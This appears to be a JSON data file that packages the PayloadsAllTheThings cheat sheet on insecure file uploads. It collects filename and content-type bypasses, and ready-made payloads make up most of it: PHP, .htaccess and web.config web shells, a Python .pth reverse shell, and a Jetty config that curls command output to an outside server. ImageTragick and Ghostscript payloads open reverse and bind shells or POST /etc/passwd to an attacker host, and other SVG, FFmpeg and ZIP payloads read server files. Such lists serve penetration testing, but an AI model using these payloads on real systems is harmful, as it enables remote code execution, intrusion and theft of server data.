@@ -1,0 +1,416 @@
+{
+  "category": "Upload Insecure Files",
+  "source": "PayloadsAllTheThings/Upload Insecure Files/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "File upload testing mindmap",
+      "language": "image",
+      "tags": ["methodology", "upload", "mindmap"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/upload-insecure-files/file-upload-mindmap.png",
+        "caption": "Decision tree for testing an upload form: what to check on the client and server side (extension, content-type, magic bytes, file processing after upload). Source: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Nature of the vulnerability and where to look",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "Uploaded files are dangerous if handled incorrectly. The attacker sends a multipart/form-data POST with a specially crafted filename or MIME type and achieves code execution.\n\nTwo different attack surfaces:\n• The mere fact of uploading an executable file (web shell) -> RCE.\n• How the file is processed AFTER upload (filename, resize, conversion, extraction) -> SQLi/XSS/LFI/XXE/RCE.\n\nCheck order: extension -> content-type -> magic bytes -> content (polyglots, images with code) -> filename -> post-processing (ImageMagick/ffmpeg/zip)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Dangerous extensions by technology",
+      "language": "table",
+      "tags": ["methodology", "extensions", "fingerprint"],
+      "body": "php asp jsp perl coldfusion nodejs",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Technology", "Extensions for web shell"],
+          "rows": [
+            ["PHP", ".php .php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc"],
+            ["ASP / IIS", ".asp .aspx .config .cer (IIS<=7.5) .asa (IIS<=7.5) .soap"],
+            ["JSP", ".jsp .jspx .jsw .jsv .jspf .wss .do .actions"],
+            ["Perl", ".pl .pm .cgi .lib"],
+            ["Coldfusion", ".cfm .cfml .cfc .dbm"],
+            ["Node.js", ".js .json .node"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Extensions for adjacent vulnerabilities",
+      "language": "table",
+      "tags": ["methodology", "extensions"],
+      "body": "svg gif csv xml avi js zip html",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Extension", "What it can trigger"],
+          "rows": [
+            [".svg", "XXE, XSS, SSRF"],
+            [".gif", "XSS"],
+            [".csv", "CSV Injection"],
+            [".xml", "XXE"],
+            [".avi", "LFI, SSRF"],
+            [".js", "XSS, Open Redirect"],
+            [".zip", "RCE, DOS, LFI Gadget"],
+            [".html", "XSS, Open Redirect"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Extension bypass",
+      "title": "Double and reverse double extension",
+      "language": "text",
+      "tags": ["bypass", "extension", "double-extension"],
+      "body": "Double extension:\n.jpg.php\n.png.php5\n\nReverse double extension (for broken Apache configs where anything with .php in the name is executed, even when not at the end):\n.php.jpg"
+    },
+    {
+      "subcategory": "Extension bypass",
+      "title": "Case switching",
+      "language": "text",
+      "tags": ["bypass", "extension", "case"],
+      "body": ".pHp\n.pHP5\n.PhAr"
+    },
+    {
+      "subcategory": "Extension bypass",
+      "title": "Null-byte (works against pathinfo())",
+      "language": "text",
+      "tags": ["bypass", "extension", "null-byte"],
+      "body": ".php%00.gif\n.php\\x00.gif\n.php%00.png\n.php\\x00.png\n.php%00.jpg\n.php\\x00.jpg"
+    },
+    {
+      "subcategory": "Extension bypass",
+      "title": "Special characters: dots, spaces, newlines",
+      "language": "text",
+      "tags": ["bypass", "extension", "special-chars"],
+      "body": "Several dots at the end: file.php......   (Windows trims trailing dots on creation).\n\nSpace and newlines:\nfile.php%20\nfile.php%0d%0a.jpg\nfile.php%0a\n\nRight-to-Left Override (RTLO): name.%E2%80%AEphp.jpg is displayed as name.gpj.php\n\nSlashes:\nfile.php/\nfile.php.\\\nfile.j\\sp\nfile.j/sp\nSeveral special characters: file.jsp/././././.\n\nUTF8 in the name: Content-Disposition: form-data; name=\"anyBodyParam\"; filename*=UTF8''myfile%0a.txt"
+    },
+    {
+      "subcategory": "Extension bypass",
+      "title": "Windows specifics: trimming the tail of the name",
+      "language": "text",
+      "tags": ["bypass", "extension", "windows"],
+      "body": "On Windows, include / require / require_once will return \"foo.php\" if it is followed by these characters:\n\\x20 ( )  \\x22 (\")  \\x2E (.)  \\x3C (<)  \\x3E (>)\n\nfopen and move_uploaded_file will return \"foo.php\" if followed by:\n\\x2E (.)  \\x2F (/)  \\x5C (\\)\n\nWith PHP on IIS, some characters are converted when saving (you can overwrite web.config via web<<):\n\\x3E (>) -> \\x3F (?)\n\\x3C (<) -> \\x2A (*)\n\\x22 (\") -> \\x2E (.)   - in the request, the Content-Disposition header must use single quotes, e.g. filename='web\"config'"
+    },
+    {
+      "subcategory": "Extension bypass",
+      "title": "NTFS Alternate Data Stream (ADS)",
+      "language": "text",
+      "tags": ["bypass", "windows", "ads"],
+      "body": "A colon \":\" is inserted after the forbidden extension and before the allowed one. On the server an empty file is created with the forbidden extension (e.g. file.asax:.jpg), which can then be edited via short filename.\n\nThe ::$DATA pattern lets you create non-empty files; a dot after it bypasses additional filters:\nfile.asp::$data."
+    },
+    {
+      "subcategory": "Content-type bypass",
+      "title": "Spoofing Content-Type to image/*",
+      "language": "text",
+      "tags": ["bypass", "content-type", "mime"],
+      "body": "Change the Content-Type of the forbidden file (application/x-php, application/octet-stream) to an allowed image one:\n\nContent-Type: image/gif\nContent-Type: image/png\nContent-Type: image/jpeg\n\nTechniques: specify Content-Type twice (one forbidden, one allowed); check which of them the server actually uses."
+    },
+    {
+      "subcategory": "Content-type bypass",
+      "title": "Dangerous PHP content-types (if the filter uses a whitelist)",
+      "language": "text",
+      "tags": ["bypass", "content-type", "php"],
+      "body": "text/php\ntext/x-php\napplication/php\napplication/x-php\napplication/x-httpd-php\napplication/x-httpd-php-source"
+    },
+    {
+      "subcategory": "Magic bytes",
+      "title": "File signatures for spoofing",
+      "language": "table",
+      "tags": ["bypass", "magic-bytes", "signature"],
+      "body": "png jpg gif magic bytes signature",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Type", "Magic bytes (prefix)"],
+          "rows": [
+            ["PNG", "\\x89PNG\\r\\n\\x1a\\n\\0\\0\\0\\rIHDR\\0\\0\\x03H\\0\\xs0\\x03["],
+            ["JPG", "\\xff\\xd8\\xff"],
+            ["GIF", "GIF87a   or   GIF8;"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Magic bytes",
+      "title": "How it works",
+      "language": "text",
+      "tags": ["bypass", "magic-bytes"],
+      "body": "Sometimes the server determines the file type by the first signature bytes. By adding/replacing them at the start of the file, you can fool the check - for example, prepend GIF8; before the PHP code so the file passes as a GIF but is interpreted as PHP."
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Classic phpinfo one-liner",
+      "language": "php",
+      "tags": ["php", "webshell", "phpinfo"],
+      "body": "<?php phpinfo(); ?>"
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Tiny shell via the short tag <?=",
+      "language": "php",
+      "tags": ["php", "webshell", "rce"],
+      "body": "<?=`$_GET[0]`?>\n<!-- tiny.php?0=ls -->"
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Shell without the <?php tag (via <script language=\"php\">)",
+      "language": "php",
+      "tags": ["php", "webshell", "bypass"],
+      "body": "<script language=\"php\">system(\"id\");</script>"
+    },
+    {
+      "subcategory": "PHP web shell",
+      "title": "Shortcut <?= instead of <?php echo",
+      "language": "php",
+      "tags": ["php", "webshell"],
+      "body": "<?=`id`?>"
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "AddType - make Apache execute any extension as PHP",
+      "language": "text",
+      "tags": ["htaccess", "apache", "rce"],
+      "body": "Upload an .htaccess with the AddType directive, then any file with the .rce extension:\n\nAddType application/x-httpd-php .rce\n\nSyntax: AddType mime-type extension [extension ...]\nImportant: .htaccess only affects its own folder and subfolders."
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "Self-contained .htaccess web shell (htshell)",
+      "language": "text",
+      "tags": ["htaccess", "apache", "webshell", "rce"],
+      "body": "# Self contained .htaccess web shell - Part of the htshell project\n# Written by Wireghoul - http://www.justanotherhacker.com\n\n# Override default deny rule to make .htaccess file accessible over web\n<Files ~ \"^\\.ht\">\nOrder allow,deny\nAllow from all\n</Files>\n\n# Make .htaccess file be interpreted as php file. This occur after apache has interpreted\n# the apache directoves from the .htaccess file\nAddType application/x-httpd-php .htaccess\n\n###### SHELL ###### <?php echo \"\\n\";passthru($_GET['c'].\" 2>&1\"); ?>###### LLEHS ######"
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "Polyglot .htaccess/image (exif_imagetype bypass)",
+      "language": "text",
+      "tags": ["htaccess", "polyglot", "bypass"],
+      "body": "If the server checks the image type via exif_imagetype, make a .htaccess/image polyglot. In .htaccess, lines starting with \\x00 and # are ignored - so the XBM and WBMP formats are suitable.\n\nGenerating .htaccess/xbm:\nwidth = 50\nheight = 50\npayload = '# .htaccess file'\n\nwith open('.htaccess', 'w') as htaccess:\n    htaccess.write('#define test_width %d\\n' % (width, ))\n    htaccess.write('#define test_height %d\\n' % (height, ))\n    htaccess.write(payload)"
+    },
+    {
+      "subcategory": ".htaccess",
+      "title": "Polyglot .htaccess/wbmp",
+      "language": "text",
+      "tags": ["htaccess", "polyglot", "bypass"],
+      "body": "type_header = b'\\x00'\nfixed_header = b'\\x00'\nwidth = b'50'\nheight = b'50'\npayload = b'# .htaccess file'\n\nwith open('.htaccess', 'wb') as htaccess:\n    htaccess.write(type_header + fixed_header + width + height)\n    htaccess.write(b'\\n')\n    htaccess.write(payload)"
+    },
+    {
+      "subcategory": "web.config",
+      "title": "web.config with an ASP shell (IIS)",
+      "language": "xml",
+      "tags": ["web.config", "iis", "asp", "rce"],
+      "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n   <system.webServer>\n      <handlers accessPolicy=\"Read, Script, Write\">\n         <add name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />         \n      </handlers>\n      <security>\n         <requestFiltering>\n            <fileExtensions>\n               <remove fileExtension=\".config\" />\n            </fileExtensions>\n            <hiddenSegments>\n               <remove segment=\"web.config\" />\n            </hiddenSegments>\n         </requestFiltering>\n      </security>\n   </system.webServer>\n</configuration>\n<!--\n<% Response.write(\"-\"&\"->\")%>\n<%\nSet oScript = Server.CreateObject(\"WSCRIPT.SHELL\")\nSet oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")\nSet oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")\n\nFunction getCommandOutput(theCommand)\n    Dim objShell, objCmdExec\n    Set objShell = CreateObject(\"WScript.Shell\")\n    Set objCmdExec = objshell.exec(thecommand)\n\n    getCommandOutput = objCmdExec.StdOut.ReadAll\nend Function\n%>\n\n<BODY>\n<FORM action=\"\" method=\"GET\">\n<input type=\"text\" name=\"cmd\" size=45 value=\"<%= szCMD %>\">\n<input type=\"submit\" value=\"Run\">\n</FORM>\n\n<PRE>\n<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>\n<%Response.Write(Request.ServerVariables(\"server_name\"))%>\n<%Response.Write(Request.ServerVariables(\"server_port\"))%>\n<%Response.Write(Request.ServerVariables(\"server_software\"))%>\n<%Response.Write(Request.ServerVariables(\"LOCAL_ADDR\"))%>\n<% szCMD = request(\"cmd\")\nthisDir = getCommandOutput(\"cmd /c\" & szCMD)\nResponse.Write(thisDir)%>\n</PRE>\n</BODY>\n<%Response.write(\"<!-\"&\"-\") %>\n-->"
+    },
+    {
+      "subcategory": "Configs for RCE",
+      "title": "uwsgi.ini - RCE via the @(exec://) operator",
+      "language": "text",
+      "tags": ["uwsgi", "config", "rce"],
+      "body": "uWSGI .ini supports \"magic\" variables. The @(...) operator includes content; the exec:// scheme reads the process stdout. It executes when the config is parsed (restart, crash, autoreload).\n\n[uwsgi]\n; read from a symbol\nfoo = @(sym://uwsgi_funny_function)\n; read from binary appended data\nbar = @(data://[ATTACKER.DOMAIN.TLD])\n; read from http\ntest = @(http://[ATTACKER.DOMAIN.TLD])\n; read from a file descriptor\ncontent = @(fd://[ATTACKER.DOMAIN.TLD])\n; read from a process stdout\nbody = @(exec://whoami)\n; call a function returning a char *\ncharacters = @(call://uwsgi_func)"
+    },
+    {
+      "subcategory": "Configs for RCE",
+      "title": "Python .pth - code execution on interpreter startup",
+      "language": "text",
+      "tags": ["python", "pth", "rce", "persistence"],
+      "body": "If you place a .pth in site-packages / dist-packages, the site module processes it on every Python startup. A line with import will run on any launch of the interpreter in that environment.\n\nFind the paths via: python3 -m site\nTypical ones: /usr/lib/pythonX.Y/site-packages/, /usr/local/lib/pythonX.Y/dist-packages/\n\nExample reverse shell (one line in .pth):\nimport socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"
+    },
+    {
+      "subcategory": "Configs for RCE",
+      "title": "Dependency managers: package.json / composer.json",
+      "language": "text",
+      "tags": ["config", "rce", "dependency"],
+      "body": "Sometimes you can upload JSON and overwrite the dependency manager config - the scripts will run.\n\npackage.json:\n\"scripts\": {\n    \"prepare\" : \"/bin/touch /tmp/pwned.txt\"\n}\n\ncomposer.json:\n\"scripts\": {\n    \"pre-command-run\" : [\n    \"/bin/touch /tmp/pwned.txt\"\n    ]\n}"
+    },
+    {
+      "subcategory": "Configs for RCE",
+      "title": "Jetty RCE - uploading an XML context",
+      "language": "xml",
+      "tags": ["jetty", "java", "rce"],
+      "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE Configure PUBLIC \"-//Jetty//Configure//EN\" \"https://www.eclipse.org/jetty/configure_10_0.dtd\">\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n    <Call class=\"java.lang.Runtime\" name=\"getRuntime\">\n        <Call name=\"exec\">\n            <Arg>\n                <Array type=\"String\">\n                    <Item>/bin/sh</Item>\n                    <Item>-c</Item>\n                    <Item>curl -F \"r=`id`\" http://yourServer:1337/</Item>\n                </Array>\n            </Arg>\n        </Call>\n    </Call>\n</Configure>"
+    },
+    {
+      "subcategory": "Server Side Include",
+      "title": "SSI - command execution and file inclusion",
+      "language": "text",
+      "tags": ["ssi", "shtml", "rce", "lfi"],
+      "body": "Upload an .shtml / .stm with SSI directives (if SSI is enabled on the server):\n\nExecute a command (exec.shtml):\n<!--#exec cmd=\"whoami\" -->\n\nInclude a file (include.shtml):\n<!--#include file=\"..\\..\\web.config\" -->"
+    },
+    {
+      "subcategory": "SVG / XML -> XXE/SSRF",
+      "title": "SVG -> file read via ImageMagick (text:)",
+      "language": "xml",
+      "tags": ["svg", "xxe", "lfi", "imagemagick"],
+      "body": "<svg width=\"1000\" height=\"1000\" \nxmlns:xlink=\"http://www.w3.org/1999/xlink\">\nxmlns=\"http://www.w3.org/2000/svg\">       \n<image xlink:href=\"text:/etc/passwd\" height=\"500\" width=\"500\"/>\n</svg>"
+    },
+    {
+      "subcategory": "SVG / XML -> XXE/SSRF",
+      "title": "SVG -> file read as HTML (html:)",
+      "language": "xml",
+      "tags": ["svg", "lfi", "imagemagick"],
+      "body": "<svg width=\"1000\" height=\"1000\" \nxmlns:xlink=\"http://www.w3.org/1999/xlink\">\nxmlns=\"http://www.w3.org/2000/svg\">       \n<image xlink:href=\"html:/etc/passwd\" height=\"500\" width=\"500\"/>\n</svg>"
+    },
+    {
+      "subcategory": "SVG / XML -> XXE/SSRF",
+      "title": "HTML file with XSS",
+      "language": "text",
+      "tags": ["html", "xss"],
+      "body": "Upload an .html to trigger XSS when it is opened:\n<script>alert('XSS')</script>"
+    },
+    {
+      "subcategory": "Filename",
+      "title": "Payloads directly in the filename",
+      "language": "text",
+      "tags": ["filename", "sqli", "xss", "lfi"],
+      "body": "Sometimes it is not the upload itself that is vulnerable, but the later processing of the filename. Put the payload in the filename:\n\nTime-Based SQLi:  poc.js'(select*from(select(sleep(20)))a)+'.extension\nLFI / Path Traversal:  image.png../../../../../../../etc/passwd\nXSS:  '\"><img src=x onerror=alert(document.domain)>.extension\nFile Traversal:  ../../../tmp/lol.png\nCommand Injection:  ; sleep 10;"
+    },
+    {
+      "subcategory": "Antivirus",
+      "title": "EICAR - checking for the presence of an antivirus",
+      "language": "text",
+      "tags": ["eicar", "antivirus", "detection"],
+      "body": "Upload the EICAR file to find out whether an antivirus is running on the server (if the file is stripped/blocked, AV is present):\n\nX5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+    },
+    {
+      "subcategory": "Picture + code (Picture)",
+      "title": "Idea: valid image with PHP code + LFI",
+      "language": "text",
+      "tags": ["picture", "lfi", "rce", "bypass"],
+      "body": "Create a valid image storing PHP code, upload it, and execute the code via Local File Inclusion.\nShell invocation: curl 'http://localhost/test.php?0=system' --data \"1='ls'\"\n\nTwo ways to hide the code:\n• Picture Metadata - payload in the EXIF comment.\n• Picture Resize - payload inside the compression so it survives the resize and bypasses getimagesize() / imagecreatefromgif()."
+    },
+    {
+      "subcategory": "Picture + code (Picture)",
+      "title": "EXIF comment with PHP (exiftool)",
+      "language": "text",
+      "tags": ["picture", "exif", "metadata", "rce"],
+      "body": "Create an image and insert PHP into the EXIF Comment tag:\n\nconvert -size 110x110 xc:white payload.jpg\nexiftool -Copyright=\"PayloadsAllTheThings\" -Artist=\"Pentest\" -ImageUniqueID=\"Example\" payload.jpg\nexiftool -Comment=\"<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();\" img.jpg"
+    },
+    {
+      "subcategory": "Picture + code (Picture)",
+      "title": "PNG with a PLTE chunk surviving imagepng() (PHP-GD)",
+      "language": "php",
+      "tags": ["picture", "png", "bypass", "rce"],
+      "body": "<?php \n//createPNGwithPLTE.php\n// bypass imageCreateFromPng and imagepng \n$_payload=\"<?php phpinfo()?> \";\n$_pay_len=strlen($_payload);\nif(strlen($_payload)%3!=0){\n echo \"payload%3==0 !\"; exit();\n}\n\n\n$width=$_pay_len/3;\n$height=20;\n//$im = imageCreateFromPng(\"existing.png\");\n$im = imagecreate($width, $height);\n\n$_hex=unpack('H*',$_payload);\n$_chunks=str_split($_hex[1], 6);\n\nfor($i=0; $i < count($_chunks); $i++){\n\n  $_color_chunks=str_split($_chunks[$i], 2);\n  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));\n\n  imagesetpixel($im,$i,1,$color);\n\n}\n\nimagepng($im,\"example.png\");"
+    },
+    {
+      "subcategory": "Picture + code (Picture)",
+      "title": "GIF with a Global Color Table surviving imagegif()",
+      "language": "php",
+      "tags": ["picture", "gif", "bypass", "rce"],
+      "body": "<?php\n// createGIFwithGlobalColorTable.php\n$_file=\"example.gif\";\n$_payload=\"<?php evil();?>\";\n$_width=200;\n$_height=200;\nif(strlen($_payload)%3!=0){\n echo \"payload%3==0 !\"; exit();\n}\n$im = imagecreate($_width, $_height);\n$_hex=unpack('H*',$_payload);\n\n$colors_hex=str_split($_hex[1], 6);\n\nfor($i=0; $i < count($colors_hex); $i++){\n  $_color_chunks=str_split($colors_hex[$i], 2);\n  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));\n  imagesetpixel($im,$i,1,$color);\n}\n\nimagegif($im,$_file);\n?>"
+    },
+    {
+      "subcategory": "Picture + code (Picture)",
+      "title": "PNG with a shell in metadata (Pillow)",
+      "language": "text",
+      "tags": ["picture", "png", "metadata", "rce"],
+      "body": "from __future__ import print_function\nfrom PIL import Image\n\n# Shellcodes - Bypass included : Keyword Recognition : System, GET, php\n# --- How to use : http://localhost/shell.php?c=echo%20'<pre>';ls\n\n#shellcode  = \"<?=@`$_GET[c]`;\"\nshellcode = \"<?php system($_GET['c']); ?>\"\n# --- How to use : http://localhost/shell.php?_=system&__=echo%20'<pre>';ls\nshellcode2 = \"<?='Sh3ll'; $_='{';$_=($_^'<').($_^'>;').($_^'/');?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>\"\n\nim = Image.new(\"RGB\", (10,10), \"Black\")\nim.info[\"shell\"] = shellcode\nreserved = ('interlace', 'gamma', 'dpi', 'transparency', 'aspect')\n\nfrom PIL import PngImagePlugin\nmeta = PngImagePlugin.PngInfo()\n\nfor k,v in im.info.items():\n\tif k in reserved: continue\n\tmeta.add_text(k, v, 0)\nim.save(\"payload.png\", \"PNG\", pnginfo=meta)"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "CVE-2016-3714 - nature and trigger",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "cve", "rce"],
+      "body": "If the backend uses ImageMagick to resize/convert images, you can exploit ImageTragick (ImageMagick 7.0.1-1). Upload a payload with an image extension.\nTriggered by the command: convert shellexec.jpeg whatever.gif"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 - reverse shell via fill url()",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "rce", "reverse-shell"],
+      "body": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://127.0.0.1/test.jpg\"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch \"hello)'\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 - bind shell via netcat",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "rce", "bind-shell"],
+      "body": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/image.jpg\"|nc -l -p 7777 -e\"/bin/sh)'\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 - reverse shell via image over /dev/tcp",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "rce", "reverse-shell"],
+      "body": "push graphic-context\nencoding \"UTF-8\"\nviewbox 0 0 1 1\naffine 1 0 0 1 0 0\npush graphic-context\nimage Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'\npop graphic-context\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 - exfil /etc/passwd to Burp Collaborator",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "exfil", "ssrf"],
+      "body": "push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 \"|curl -d \"@/etc/passwd\" -X POST https://xxx.burpcollaborator.net/test1 \")' pop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 - wget via image over",
+      "language": "text",
+      "tags": ["imagemagick", "imagetragick", "ssrf"],
+      "body": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 127.0.0.1:1337 > /dev/null`'\npop graphic-context"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #1 - SVG/XML reverse shell (nc.traditional)",
+      "language": "xml",
+      "tags": ["imagemagick", "imagetragick", "svg", "reverse-shell"],
+      "body": "<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n\"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<svg width=\"640px\" height=\"480px\" version=\"1.1\"\nxmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\n\"http://www.w3.org/1999/xlink\">\n<image xlink:href=\"https://example.com/image.jpg&quot;|/bin/nc.traditional 127.0.0.1 4242 -e /bin/bash&quot;\"\nx=\"0\" y=\"0\" height=\"640px\" width=\"480px\"/>\n</svg>"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "ImageTragick #3 - Ghostscript: execute id",
+      "language": "text",
+      "tags": ["imagemagick", "ghostscript", "rce"],
+      "body": "%!PS\nuserdict /setpagedevice undef\nsave\nlegal\n{ null restore } stopped { pop } if\n{ legal } stopped { pop } if\nrestore\nmark /OutputFile (%pipe%id) currentdevice putdeviceprops"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "Ghostscript - reverse shell via bash /dev/tcp",
+      "language": "text",
+      "tags": ["imagemagick", "ghostscript", "reverse-shell"],
+      "body": "%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1') currentdevice putdeviceprops"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "Ghostscript - callback via curl",
+      "language": "text",
+      "tags": ["imagemagick", "ghostscript", "ssrf"],
+      "body": "%!PS\nuserdict /setpagedevice undef\nlegal\n{ null restore } stopped { pop } if\nlegal\nmark /OutputFile (%pipe%curl http://attacker.com/?a=callback) currentdevice putdeviceprops"
+    },
+    {
+      "subcategory": "ImageMagick (ImageTragick)",
+      "title": "CVE-2022-44268 - file read via PNG (info disclosure)",
+      "language": "text",
+      "tags": ["imagemagick", "cve", "lfi", "disclosure"],
+      "body": "Information disclosure in ImageMagick: create a PNG whose processing leaks the contents of a server file.\n\n# Generating the payload\napt-get install pngcrush imagemagick exiftool exiv2 -y\npngcrush -text a \"profile\" \"/etc/passwd\" exploit.png\n\n# Trigger: the backend does something like convert pngout.png pngconverted.png\n# Download the result and inspect: identify -verbose pngconverted.png\n# Decode the leaked data:\npython3 -c 'print(bytes.fromhex(\"HEX_FROM_FILE\").decode(\"utf-8\"))'"
+    },
+    {
+      "subcategory": "FFmpeg HLS",
+      "title": "FFmpeg HLS CVE - file read via AVI with an HLS playlist",
+      "language": "text",
+      "tags": ["ffmpeg", "cve", "lfi", "ssrf"],
+      "body": "When processing video, FFmpeg can be made to read arbitrary files via a malicious HLS playlist inside an AVI (GAB2).\n\n1. ./gen_xbin_avi.py file://<filename> file_read.avi\n2. Upload file_read.avi to a site that processes video\n3. On the server it runs: ffmpeg -i file_read.avi output.mp4\n4. Click \"Play\" in the video service\n5. If you are lucky, you will see the contents of <filename> from the server\n\nGenerated playlist:\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0\nGOD.txt\n#EXTINF:1.0\n/etc/passwd\n#EXT-X-ENDLIST"
+    },
+    {
+      "subcategory": "ZIP / archives",
+      "title": "ZIP with a symlink to /etc/passwd",
+      "language": "text",
+      "tags": ["zip", "symlink", "lfi"],
+      "body": "If the server extracts a ZIP and serves its contents, pack a symlink to /etc/passwd. After extraction, reading the \"file\" returns the target system file.\n\nln -s /etc/passwd link\nzip --symlinks test.zip link"
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Tools for testing uploads",
+      "language": "text",
+      "tags": ["tools", "methodology"],
+      "body": "• Fuxploider - scanner and exploitation for file upload vulnerabilities (github.com/almandin/fuxploider).\n• Burp Upload Scanner - a BApp for testing uploads via Burp Proxy.\n• ZAP FileUpload - an OWASP ZAP add-on for finding vulnerabilities in upload forms."
+    }
+  ]
+}
